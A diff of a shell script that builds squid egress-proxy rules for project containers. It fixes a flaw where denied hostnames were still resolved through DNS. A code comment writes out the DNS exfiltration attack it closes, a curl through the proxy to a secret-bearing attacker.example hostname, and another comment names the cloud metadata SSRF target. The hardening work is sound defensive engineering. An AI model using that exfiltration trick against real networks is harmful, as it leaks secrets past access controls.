@@ -2427,7 +2427,7 @@ write_egress_configs() {
   # Overwriting files in place keeps the mount coherent.
   mkdir -p "$edir"
   EGRESS_PUB=(); EGRESS_PROJECTS=""
-  local relays="" acls="" allows="" d pdir name subnet aclname doms ips sshport _line _spec hp cp
+  local relays="" acls="" gates="" allows="" all_srcs="" d pdir name subnet aclname doms ips sshport _line _spec hp cp
 
   for pdir in "$PROJECTS_DIR"/*/; do
     [ -d "$pdir" ] || continue
@@ -2460,16 +2460,28 @@ write_egress_configs() {
         esac
       done < "$pdir/allowed_hosts"
     fi
+    # SEC-05: decide on the NAME before anything that needs an ADDRESS.
+    # A `dst` ACL makes squid resolve the requested hostname — for DENIED hosts
+    # too — so `curl -x proxy http://<secret>.attacker.example/` leaked data to
+    # the attacker's DNS server despite TCP_DENIED. Names and IPs therefore share
+    # ONE `dstdomain -n` list: `-n` stops the reverse lookup squid would otherwise
+    # do for an IP-literal URL, and an IP entry matches a request addressed to
+    # that IP literally. Trade-off: an allowed IP no longer also allows a
+    # hostname that happens to resolve to it — that would need the lookup.
+    all_srcs="$all_srcs $subnet"
     acls="$acls
 acl p_$aclname src $subnet"
-    [ -n "$doms" ] && acls="$acls
-acl d_$aclname dstdomain$doms"
-    [ -n "$ips" ] && acls="$acls
-acl i_$aclname dst$ips"
-    [ -n "$doms" ] && allows="$allows
+    if [ -n "$doms$ips" ]; then
+      acls="$acls
+acl d_$aclname dstdomain -n$doms$ips"
+      gates="$gates
+http_access deny p_$aclname !d_$aclname"
+      allows="$allows
 http_access allow p_$aclname d_$aclname"
-    [ -n "$ips" ] && allows="$allows
-http_access allow p_$aclname i_$aclname"
+    else
+      gates="$gates
+http_access deny p_$aclname"
+    fi
 
     # Relays require the ports to be free on the host. If the project container
     # is RUNNING and still publishes its own ports (started before it became
@@ -2524,14 +2536,25 @@ forwarded_for delete
 acl Connect_ports port 443 22 80 9418
 acl CONNECT method CONNECT
 
-# Never let a project reach loopback, private/container networks, or link-local
-# through the proxy (169.254.169.254 is the cloud metadata endpoint — the
-# classic SSRF credential-theft target; deny it even though it's inert locally).
+# Loopback, private/container networks and link-local (169.254.169.254 is the
+# cloud metadata endpoint — the classic SSRF credential-theft target).
 acl to_localnets dst 127.0.0.0/8 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 169.254.0.0/16 fc00::/7 fe80::/10 ::1/128
-http_access deny to_localnets
-
-http_access deny CONNECT !Connect_ports
 $acls
+acl nixenv_projects src$all_srcs
+
+# ORDER MATTERS (SEC-05). squid evaluates http_access top-down and stops at the
+# first match, so every rule ABOVE the first 'dst' ACL decides without DNS.
+# 'to_localnets' is a dst ACL — it resolves the hostname — so it must only be
+# reached by requests whose NAME is already allowed. Denied names never reach it,
+# and are never looked up.
+#   1. unknown source          (src — no DNS)
+#   2. bad CONNECT port        (method/port — no DNS)
+#   3. per-project NAME gate   (dstdomain -n — no DNS)
+#   4. private destinations    (dst — resolves, but only allowed names get here)
+http_access deny !nixenv_projects
+http_access deny CONNECT !Connect_ports
+$gates
+http_access deny to_localnets
 $allows
 http_access deny all
 EOF
